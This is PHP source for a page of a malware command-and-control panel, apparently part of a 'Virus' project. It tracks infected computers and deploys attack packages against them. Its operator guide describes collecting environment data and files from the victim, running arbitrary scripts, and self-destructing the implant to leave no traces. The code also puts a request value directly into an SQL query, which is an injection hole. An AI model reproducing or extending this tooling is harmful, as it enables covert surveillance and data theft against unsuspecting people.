<?php /** @noinspection DuplicatedCode */

/** @noinspection PhpUnusedParameterInspection */

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Header;
use Kelvinho\Virus\HtmlTemplate;
use Kelvinho\Virus\Logs;
use Kelvinho\Virus\Timezone;
use Kelvinho\Virus\User;
use Kelvinho\Virus\Virus\Virus;
use function Kelvinho\Virus\db;
use function Kelvinho\Virus\filter;
use function Kelvinho\Virus\formattedHash;
use function Kelvinho\Virus\formattedTime;
use function Kelvinho\Virus\initializeArray;
use function Kelvinho\Virus\map;

if ($requestData->hasGet("virus_id")) {
    $virus_id = $requestData->get("virus_id");
    $session->set("virus_id", $virus_id);
} else {
    if ($session->has("virus_id")) {
        $virus_id = $session->get("virus_id");
    } else {
        header("Location: " . DOMAIN);
        Header::redirect();
    }
}

if (!Virus::exists($virus_id)) {
    header("Location: " . DOMAIN);
    Header::redirect();
}

/**
 * Returns a table element with all you need to display
 *
 * @param array $attacks Array of attack ids
 * @param array $labels Array of labels used for the header
 * @param callable $contents Callable which upon consumption of an attack id will return an array containing the fields
 * @param null $extraData
 * @return false|string
 */
function displayTable(array $attacks, array $labels, callable $contents, $extraData = null) {
    ob_start();
    if (count($attacks) === 0) { ?>
        <p>(No attacks)</p>
    <?php } else { ?>
        <div style="overflow: auto;">
            <table>
                <tr>
                    <?php map($labels, function ($label) { ?>
                        <th><?php echo $label; ?></th>
                    <?php }); ?>
                </tr>
                <?php
                map($attacks, function ($attack_id, $index, $contents) { ?>
                    <tr style="cursor: pointer;">
                        <?php map($contents[0]($attack_id, $contents[1]), function ($content) { ?>
                            <td><?php echo $content; ?></td>
                        <?php }); ?>
                    </tr>
                <?php }, [$contents, $extraData]); ?>
            </table>
        </div>
    <?php }
    return ob_get_clean();
}

if (!$authenticator->authorized($virus_id)) {
    header("Location: " . DOMAIN);
    Header::redirect();
}
$virus = $virusFactory->get($virus_id);
$user = User::get($session->get("user_handle")); ?>
<html lang="en_US">
<head>
    <title>Virus info</title>
    <?php echo HtmlTemplate::header(); ?>
    <style>
        #dailyChartDiv {
            position: relative;
            margin: auto;
            width: 40vw;
            display: inline-block;
        }

        #monthlyChartDiv {
            position: relative;
            margin: auto;
            width: 40vw;
            display: inline-block;
        }

        @media only screen and (max-width: 900px) {
            #dailyChartDiv {
                width: 60vw;
                display: block;
            }

            #monthlyChartDiv {
                width: 60vw;
                display: block;
            }
        }

        @media only screen and (max-width: 600px) {
            #dailyChartDiv {
                width: 80vw;
                display: block;
            }

            #monthlyChartDiv {
                width: 80vw;
                display: block;
            }
        }
    </style>
</head>
<body>
<h1><a href="<?php echo DOMAIN_DASHBOARD; ?>">Virus info</a></h1>
<label for="name">
    Name
    <input id="name" class="w3-input" type="text" value="<?php echo $virus->getName(); ?>">
</label>
<br>
<label>
    Hash/id
    <input class="w3-input" type="text" disabled value="<?php echo $virus_id; ?>">
</label>
<br>
<label>
    Last ping
    <input class="w3-input" type="text" disabled
           value="<?php echo formattedTime($virus->getLastPing() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone() . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
</label>
<br>
<label for="profile">Profile</label>
<textarea id="profile" rows="12" cols="80" class="w3-input"
          style="resize: vertical;"><?php echo $virus->getProfile(); ?></textarea>
<br>
<div class="w3-button w3-red" onclick="updateVirus()">Update</div>
<h1>Activity</h1>
<div>
    <div id="dailyChartDiv">
        <canvas id="dailyChart"></canvas>
    </div>
    <div id="monthlyChartDiv">
        <canvas id="monthlyChart"></canvas>
    </div>
</div>
<p>The daily active view shows at which times the virus reports back indicating that it is still alive and still
    listening, while the monthly frequency view shows how many hours the virus is active in a particular hour (ex.
    from 03:00 to 04:00) for a whole month. The two actually is kinda similar, not much different there.</p>
<h1>Attacks</h1>
<h2>New attack</h2>
<label for="attackName">Name. This is an optional short name to help you stay organized</label>
<input id="attackName" class="w3-input" type="text">
<br>
<div class="w3-dropdown-hover w3-light-grey" style="margin-right: 15px;">
    <button id="attackPackage" class="w3-button">Choose attack package</button>
    <div class="w3-dropdown-content w3-bar-block w3-border">
        <?php map(PackageRegistrar::getPackages(), function ($package) { ?>
            <a onclick="changePackage(<?php echo "'$package'"; ?>)"
               class="w3-bar-item w3-button"><?php echo PackageRegistrar::getDisplayName($package); ?></a>
        <?php }); ?>
    </div>
</div>
<div class="w3-button w3-red" onclick="continueAttack()">Continue</div>
<?php map(PackageRegistrar::getPackages(), function ($dbName) { ?>
    <p id="packageDescription-<?php echo $dbName; ?>" class="packageDescriptions">Package
        description: <?php echo PackageRegistrar::getDescription($dbName); ?></p>
<?php }); ?>
<div id="message" style="color: red;"></div>
<h2>Dormant attacks</h2>
<p>These are attacks that are not yet executed, and are not sent to the virus to execute. It just kinda hangs around
    here until you want to attack.</p>
<?php echo displayTable(Virus::getAttacks($virus_id, AttackInterface::STATUS_DORMANT), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
    $attack = $attackFactory->get($attack_id);
    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
    return ["<a $onclick>" . $attack->getName() . "</a>",
        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
}); ?>
<h2>Deployed attacks</h2>
<p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
    be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
    is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
    here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
    over again.</p>
<?php echo displayTable(Virus::getAttacks($virus_id, AttackInterface::STATUS_DEPLOYED), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
    $attack = $attackFactory->get($attack_id);
    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
    return ["<a $onclick>" . $attack->getName() . "</a>",
        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
}); ?>
<h2>Executed attacks</h2>
<p>These are attacks that are executed, and the virus has sent back results.</p>
<?php echo displayTable(Virus::getAttacks($virus_id, AttackInterface::STATUS_EXECUTED), ["Name", "Package", "Hash/id", "Executed time", ""], function ($attack_id, $timezone) use ($attackFactory) {
    $attack = $attackFactory->get($attack_id);
    $onclick = "onclick = \"redirect('" . DOMAIN_ATTACK_INFO . "?attack_id=" . $attack_id . "')\"";
    return ["<a $onclick>" . $attack->getName() . "</a>",
        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
        "<a $onclick>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
}, $user->getTimezone()); ?>
<h2>How to choose?</h2>
<p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
    guide.</p>
<p>When the virus is newly installed, you may want to use these packages:</p>
<ul>
    <li>CollectEnv</li>
    <li>ScanPartitions</li>
    <li>SystemInfo</li>
</ul>
<p>These packages don't need any configuring to do. You can just create a new attack, deploy it and receive the
    results back. When you get the hang of what is available on the target computer, you can use <b>ExploreDir</b>
    to explore what files and folders are there on the host computer, then use <b>CollectFile</b> to collect any
    files that pique your interest.</p>
<p>The virus itself is pretty stealthy, but if for whatever reason that you need to self destruct the virus
    completely, leaving no traces behind, you can use the <b>SelfDestruct</b> package. Be warned that once you have
    done this, there is absolutely no way of recovering it, even I can't recover it and you pretty much have to
    have access to their computer again or talk really sweet to them and whatnot.</p>
<p>If you are an advanced user. That means, you know your stuff, you know specifically how the windows command
    line work, you know about its permission schemes, you know how the boot up process works, etc, then these are
    the rest of the tools to help you:</p>
<ul>
    <li>CheckPermission</li>
    <li>ExecuteScript</li>
    <li>Rebase</li>
</ul>
<p>Of course, everything here can be done via the ExecuteScript package alone, but using this is very much
    discouraged. I have lost so many viruses in the past prior to this update because of some stupid untested code
    that I have written, and the virus decides to just stay silent forever. If you were to use this for some complex
    payload then I suggest reading over the entire source code (<a href="<?php echo GITHUB_PAGE; ?>"
                                                                   style="color: blue;">github link</a>)
    of this tool to know how it works. Once you have understood it, I suggest you stick with the virus's
    representation,
    to make sure the other packages work nicely as well.</p>
<p>Also note that some packages are "easy", others are "advanced". If a package is easy, that means that it is
    fairly difficult to screw something up, and it's pretty easy to just execute it without thinking of its
    consequences. If it is not, that means that it is easy to screw things up, and you might accidentally remove the
    virus from existence, or you have to know more about what you are planning to do to understand how to deploy it
    successfully.</p>
<h2>Random bits of information that I don't know where it fits in</h2>
<p>The attack name has a pretty limited character limit, and it's supposed to be. If you need a bigger space to note
    things down then in every viruses and attacks, you can write it in the "profile" section.</p>
<p>If an attack is occurring and the host computer shuts down, then when the computer reboots, the virus itself
    will start up, but the attack will not continue and no answer will be given back to the application. So if this
    happens, your only option is to delete that attack, and initiate another attack with the same parameters.</p>
<p>A nice little trick throughout the application is that you can click on the first header in a site to go
    backwards to the parent screen. Meaning, clicking on the attack info page will redirect to the virus info page,
    and clicking on the virus info page will redirect to the dashboard.</p>
<p>You can look to previous days using the daily active view graph. Just click on the graph anywhere on the left to
    move back 1 day, and on the graph to the right to move forward 1 day.</p>
<p>Note that once you have deployed the attack, the virus most likely will have noticed that new payload (less
    than <?php echo VIRUS_PING_INTERVAL; ?> seconds) before you can press cancel. This means you shouldn't rely on
    the feature much, and it's there to cancel attacks when the host computer is shutdown only.</p>
<p>When you deploy an attack, it takes time for the virus to execute the attack, so be patient with it, and
    refreshes the screen to see whether it has reported back or not.</p>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js"></script>
<script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
<script type="application/javascript">
    const gui = {
        packageDescriptions: $(".packageDescriptions"),
        attackPackage: $("#attackPackage"),
        message: $("#message"),
        attackName: $("#attackName")
    };

    function updateVirus() {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/updateVirus",
            type: "POST",
            data: {
                virus_id: "<?php echo $virus_id; ?>",
                name: $("#name").val(),
                profile: $("#profile").val()
            },
            success: function (response) {
                console.log(response);
                window.location = "<?php echo DOMAIN_VIRUS_INFO; ?>";
            }
        });
    }

    gui.packageDescriptions.css("display", "none");

    const packageNames = {<?php echo join(", ", map(PackageRegistrar::getPackages(), function ($dbName) {
            return "\"$dbName\": \"" . PackageRegistrar::getDisplayName($dbName) . "\"";
        })) ?>};

    function changePackage(packageDbName) {
        gui.attackPackage.html(packageNames[packageDbName]);
        gui.attackPackage.attr("name", packageDbName);
        gui.packageDescriptions.css("display", "none");
        $("#packageDescription-" + packageDbName.replace(/\./g, "\\.")).css("display", "block");
        gui.message.html("");
    }

    function continueAttack() {
        if (gui.attackPackage.html() === "Choose attack package") {
            gui.message.html("<br>Please choose an attack package first");
            return;
        }
        let attackName = gui.attackName.val();
        if (attackName.length > 50) {
            gui.message.html("Message name should be less than 50 characters");
            return;
        }
        if (attackName === "") {
            attackName = "(not set)";
        }
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER . "/newAttack"; ?>",
            type: "POST",
            data: {
                virus_id: <?php echo "\"$virus_id\""; ?>,
                attack_package: gui.attackPackage.attr("name"),
                name: attackName
            },
            success: function (response) {
                if (response === "0") {
                    console.log("This is not supposed to happen");
                } else {
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            }
        });
    }

    function deleteAttack(attack_id, virus_id) {
        $.ajax({
            url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteAttack",
            type: "POST",
            data: {
                attack_id: attack_id,
                virus_id: virus_id
            },
            success: function () {
                window.location = "<?php echo DOMAIN_VIRUS_INFO; ?>"
            }
        });
    }

    function redirect(location) {
        window.location = location;
    }

    <?php
    function fixHour(int $hour) {
        return ($hour + 24 * 3) % 24;
    }

    function getUptimes(string $virus_id): array {
        // fetching uptimes
        $uptimes = [];
        $mysqli = db();
        if ($mysqli->connect_errno) {
            Logs::mysql($mysqli->connect_error);
        }
        $answer = $mysqli->query("select unix_time, cast(active as unsigned integer) as activeI from uptimes where virus_id = \"$virus_id\" order by unix_time");
        $mysqli->close();
        if ($answer) {
            while ($row = $answer->fetch_assoc()) {
                $uptimes[] = ["unix_time" => (int)$row["unix_time"], "active" => (int)$row["activeI"]];
            }
        }
        return $uptimes;
    }

    /**
     * Get a graphable 24-element array of {"hours", "label"}
     *
     * @param string $virus_id The virus id
     * @param int $user_time_zone
     * @param int $startTimeOfDay
     * @return array the graphable array
     */
    function getDailyTimes(string $virus_id, int $user_time_zone, int $startTimeOfDay = -1) {
        // important variables
        if ($startTimeOfDay == -1) {
            $startTimeOfDay = time() - 24 * 3600;
        }
        $startTimeOfDay = strtotime(date("Y-m-d H:00:00", $startTimeOfDay));
        $endTimeOfDay = $startTimeOfDay + 24 * 3600;
        $cycles = 12;// 12 cycles per hour, meaning 5 minutes per cycle
        // fetching uptimes
        $uptimes = getUptimes($virus_id);
        // filtering out the uptimes that are more than 1 month away
        $uptimes = filter($uptimes, function ($element, $index, $data) {
            return $data["startTime"] < $element["unix_time"] && $data["endTime"] > $element["unix_time"];
        }, ["startTime" => $startTimeOfDay, "endTime" => $endTimeOfDay]);
        $uptimes[] = ["unix_time" => $endTimeOfDay];
        $data = initializeArray(24, 0); // string hour_interval => int hours
        $analysisTime = $startTimeOfDay;
        $analysisTimeSlice = date("G", $analysisTime);
        if (count($uptimes) > 1) {
            $uptimeCounter = 0;
            $loopCounter = 0;
            $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
            $active = 1 - $uptimes[$uptimeCounter]["active"];
            while (true) {
                if ($analysisTime > $nextEntryUptime) {
                    $uptimeCounter += 1;
                    if ($uptimeCounter >= count($uptimes)) {
                        break;
                    }
                    $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                    $active = 1 - $active;
                }
                $data[intdiv($loopCounter, $cycles) % 24] += ($active) / $cycles;
                $analysisTime += 3600 / $cycles;
                $loopCounter += 1;
            }
        }
        $graphable = [];
        //$hourSliceLabels = [0 => "00:00", 6 => "06:00", 12 => "12:00", 18 => "18:00"];
        $hourSliceLabels = [0 => "00:00", 4 => "04:00", 8 => "08:00", 12 => "12:00", 16 => "16:00", 20 => "20:00"];
        for ($i = 0; $i < 24; $i++) {
            $graphable[$i] = ["hours" => $data[$i], "label" => @$hourSliceLabels[fixHour($i + $analysisTimeSlice + $user_time_zone)]];
        }
        return $graphable;
    }
    //$graphableDaily = getDailyTimes($virus_id, $user->getTimezone());
    $graphableDaily = getDailyTimes($virus_id, $user->getTimezone());
    ?>
    const days = <?php echo "[" . join(", ", map([14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1], function ($daysBack, $index, $data) {
            $startTime = $data["currentTime"] - $daysBack * 24 * 3600;
            $graphableDaily = getDailyTimes($data["virus_id"], $data["timeZone"], $startTime);
            return "{labels: [" . join(", ", map($graphableDaily, function ($element) {
                    return "\"" . $element["label"] . "\"";
                })) . "], " .
                "data: [" . join(", ", map($graphableDaily, function ($element) {
                    return min($element["hours"], 1) * 100;
                })) . "], " .
                "title: \"" . date("M j", $startTime) . " - " . date("M j", $startTime + 24 * 3600) . "\"}";
        }, ["currentTime" => time(), "timeZone" => $user->getTimezone(), "virus_id" => $virus_id])) . "];";

        function getMonthlyTimes(string $virus_id, int $user_time_zone) {
            // important variables
            $currentTime = time();
            $cycles = 12;// 12 cycles per hour, meaning 5 minutes per cycle
            // fetching uptimes
            $uptimes = getUptimes($virus_id);
            // filtering out the uptimes that are more than 1 month away
            $uptimes[] = ["unix_time" => $currentTime];
            $uptimes = filter($uptimes, function ($element, $index, $currentTime) {
                return $currentTime - $element["unix_time"] < 30 * 24 * 3600;
            }, $currentTime);
            $data = initializeArray(24, 0); // string hour_interval => int hours
            $analysisTime = $currentTime - 30 * 24 * 3600;
            $analysisTimeSlice = date("G", $analysisTime);
            if (count($uptimes) > 1) {
                $uptimeCounter = 0;
                $loopCounter = 0;
                $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                $active = 1 - $uptimes[$uptimeCounter]["active"];
                while (true) {
                    if ($analysisTime > $nextEntryUptime) {
                        $uptimeCounter += 1;
                        if ($uptimeCounter >= count($uptimes)) {
                            break;
                        }
                        $nextEntryUptime = $uptimes[$uptimeCounter]["unix_time"];
                        $active = 1 - $active;
                    }
                    $data[intdiv($loopCounter, $cycles) % 24] += ($active) / $cycles;
                    $analysisTime += 3600 / $cycles;
                    $loopCounter += 1;
                }
            }
            $graphable = [];
            for ($i = 0; $i < 24; $i++) {
                $graphable[$i] = ["hours" => $data[fixHour($i - $analysisTimeSlice - $user_time_zone)]];
            }
            return $graphable;
        }
        $graphableMonthly = getMonthlyTimes($virus_id, $user->getTimezone());
        ?>

        chartColors = {
            red: 'rgb(255, 99, 132)',
            orange: 'rgb(255, 159, 64)',
            yellow: 'rgb(255, 205, 86)',
            green: 'rgb(75, 192, 192)',
            blue: 'rgb(54, 162, 235)',
            purple: 'rgb(153, 102, 255)',
            grey: 'rgb(201, 203, 207)'
        };

    Chart.defaults.global.elements.point.radius = 0;

    let dayIndex = days.length - 1;

    dailyChart = new Chart(document.getElementById('dailyChart').getContext('2d'), {
        type: 'line',
        data: {
            labels: days[dayIndex].labels,
            datasets: [{
                label: 'First dataset',
                //steppedLine: "middle",
                backgroundColor: chartColors.orange,
                borderColor: chartColors.orange,
                borderWidth: 0,
                data: days[dayIndex].data,
                fill: true
            }]
        },
        options: {
            responsive: true,
            title: {
                display: true,
                text: "Daily active view (" + days[dayIndex].title + ")"
            },
            aspectRatio: 1.8,
            hover: {mode: 'nearest', intersect: true},
            legend: {display: false},
            scales: {
                xAxes: [{ticks: {autoSkip: false}}],
                yAxes: [{scaleLabel: {display: true, labelString: '% Hour'}}]
            }
        }
    });

    $("#dailyChart").click(function (event) {
        if (event.offsetX > $("#dailyChart").width() / 2) {
            gotoNextDay();
        } else {
            gotoPreviousDay();
        }
    });

    function changeDayGraph() {
        dailyChart.data.labels = days[dayIndex].labels;
        dailyChart.data.datasets[0].data = days[dayIndex].data;
        dailyChart.options.title.text = "Daily active view (" + days[dayIndex].title + ")";
        dailyChart.update();
    }

    function gotoNextDay() {
        if (dayIndex < days.length - 1) {
            dayIndex += 1;
        }
        changeDayGraph();
    }

    function gotoPreviousDay() {
        if (dayIndex > 0) {
            dayIndex -= 1;
        }
        changeDayGraph();
    }

    new Chart(document.getElementById('monthlyChart').getContext('2d'), {
        type: 'line',
        data: {
            labels: ["00:00", "", "", "", "04:00", "", "", "", "08:00", "", "", "", "12:00", "", "", "", "16:00", "", "", "", "20:00", "", "", ""],
            datasets: [{
                label: 'Second dataset',
                backgroundColor: chartColors.green,
                borderColor: chartColors.green,
                borderWidth: 0,
                cubicInterpolationMode: 'monotone',
                data: [<?php echo join(", ", map($graphableMonthly, function ($element) {
                    return $element["hours"];
                })); ?>]
            }]
        },
        options: {
            responsive: true,
            title: {display: true, text: "Monthly frequency view"},
            aspectRatio: 1.8,
            legend: {display: false},
            scales: {
                xAxes: [{ticks: {autoSkip: false}}],
                yAxes: [{scaleLabel: {display: true, labelString: 'Hours'}}]
            }
        }
    });
</script>
</html>
